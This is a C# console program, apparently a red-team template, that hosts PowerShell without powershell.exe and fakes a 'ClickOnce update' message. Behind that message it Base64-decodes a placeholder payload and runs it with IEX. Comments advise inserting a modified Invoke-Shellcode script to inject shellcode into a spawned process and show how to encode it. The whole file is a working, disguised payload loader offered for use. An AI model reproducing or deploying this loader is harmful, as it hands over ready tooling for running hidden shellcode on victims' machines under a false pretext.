using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Resources;
using System.Net;

using System.Collections.ObjectModel;

//
// Use NuGet to install System.Management.Automation reference.
//
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace ConsoleApplication2
{
    class Program
    {
        //
        // This function and concept comes from PowerPick / SharpPick project by Sixdub:
        //      https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick
        //
        static string RunPS(string cmd)
        {
            // Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            // Add commands
            pipeline.Commands.AddScript(cmd);

            // Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            // Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        static void Main()
        {
            Console.WriteLine("Updating ClickOnce application. Please wait...");

            //
            // Here comes your Base64 encoded Powershell payload.
			// A good example of what to stick in here is a modified Invoke-Shellcode.ps1
			// that will spawn a process and insert there some shellcode.
			// You can prepare Base64 UTF8 shellcode via:
			//		PS> $text = Get-Content yourShellcode.ps1
			//		PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text);
			//		PS> $encoded = [Convert]::ToBase64String($bytes);
			//		PS> $encoded | Out-File "myEncodedShellcode.ps1"
            //
            String base64encodedPayload = "<INSERT HERE YOUR BASE64 ENCODED POWERSHELL PAYLOAD>";

            RunPS("IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"" + base64encodedPayload + "\")))");
        }
    }
}
